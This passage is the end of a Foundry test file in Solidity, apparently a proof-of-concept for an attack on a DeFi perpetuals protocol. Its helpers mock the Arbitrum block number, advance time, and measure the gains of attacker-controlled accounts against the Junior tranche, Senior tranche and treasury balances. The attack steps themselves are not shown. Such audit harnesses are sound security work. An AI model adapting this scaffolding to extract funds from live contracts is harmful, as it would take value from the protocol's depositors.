                    prevPublishTime: prevPublishTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
        ++l2Block;
        _mockL2Block();
    }

    /// @dev Foundry's built-in ArbSys emulation returns the fixed fork block; advance the L2 block number with the
    ///      test's own block sequence so commit and execution land in successive L2 blocks, as on-chain.
    function _mockL2Block() internal {
        vm.mockCall(ARB_SYS, abi.encodeWithSignature("arbBlockNumber()"), abi.encode(l2Block));
    }

    function _withdrawAll(
        address account
    ) internal {
        uint256 balance = clearinghouse.balanceAssets(account);
        if (balance > 0) {
            vm.prank(account);
            clearinghouse.withdraw(account, balance);
        }
    }

    function _attackerUsdg() internal view returns (uint256) {
        return IERC20(USDG).balanceOf(ATTACKER_LP) + IERC20(USDG).balanceOf(ATTACKER_TRADER)
            + IERC20(USDG).balanceOf(ATTACKER_KEEPER) + clearinghouse.balanceAssets(ATTACKER_TRADER)
            + clearinghouse.balanceAssets(ATTACKER_KEEPER);
    }

    /// @dev Attacker's escrowed or held Junior shares valued at the protocol's own pending (post-reconcile) price.
    function _attackerJuniorValue() internal view returns (uint256) {
        (, uint256 juniorPending) = pool.getPendingDepositTrancheState();
        return (juniorPending * attackerShares) / junior.totalSupply();
    }

    function _log(
        string memory tag,
        RunResult memory r
    ) internal pure {
        console2.log(tag);
        console2.log("  attacker initial (USDG + Junior value)", r.attackerInitial);
        console2.log("  attacker final USDG                   ", r.attackerFinal);
        console2.log("  attacker exit assets funded           ", r.redeemAssets);
        console2.log("  attacker LONG size (18 dp)            ", r.size);
        console2.log("  VPI accrued while epoch settles       ", r.vpiChargeAtSettle);
        console2.log("  Junior NAV before / after open        ", r.juniorNavBeforeOpen, r.juniorNavAfterOpen);
        console2.log("  pool before / after close             ", r.poolBeforeClose, r.poolAfterClose);
        console2.log("  incumbent Junior final                ", r.juniorFinal);
        console2.log("  Senior final                          ", r.seniorFinal);
        console2.log("  treasury final                        ", r.treasuryFinal);
    }

}
```
